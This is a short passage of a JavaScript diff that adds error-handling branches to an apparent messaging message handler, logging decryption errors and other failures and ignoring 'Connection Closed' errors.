+                logWarning('🔐 Decryption error - session may be corrupted', '🔐');
+            } else if (error.message && error.message.includes('Connection Closed')) {
+                // Ignore connection closed errors
+            } else {
+                logError(`Message handler error: ${error.message}`, '❌');
             }
         }
     });
